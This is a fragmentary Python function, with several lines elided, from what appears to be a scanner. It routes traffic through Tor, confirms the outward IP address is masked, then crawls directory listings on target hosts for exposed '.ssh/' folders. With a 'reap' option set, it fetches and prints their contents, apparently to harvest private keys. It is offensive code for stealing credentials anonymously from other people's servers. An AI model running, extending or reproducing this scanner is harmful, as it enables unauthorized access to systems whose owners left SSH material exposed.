...
def do_request(reap, notor, ig_hist, port, targ):
    ...
    if (notor == False):
        ...
        if (post.content == pre.content):
            print("\nERR: With and without tor ip address are same.")
            ...
            if (target.strip() + "\n" not in history or ig_hist):
                ...
                for line in r.content.decode().split("\n"):
                    if ("<a href=\"" in line):
                        file = line.split("href=\"")[1].split("\"")[0]
                        if ".ssh/" in file:
                            q = s.get(f"http://{target.strip()}:{port}/.ssh/", timeout=10)
                            print(Fore.RESET + f"http://{target.strip()}:{port}/.ssh/ --> Status Code: {q.status_code}")
                            key = ssh_words(q.content, target.strip())
                            if ((key and reap) or (targ and reap)):
                                print(f"{target.strip()} contains:")
                                print(q.content.decode().split("\n"))
                                for line in q.content.decode().split("\n"):
                                    if ("<a href=\"" in line):
                                        file = line.split("href=\"")[1].split("\"")[0]
                                        print("\t" + file)
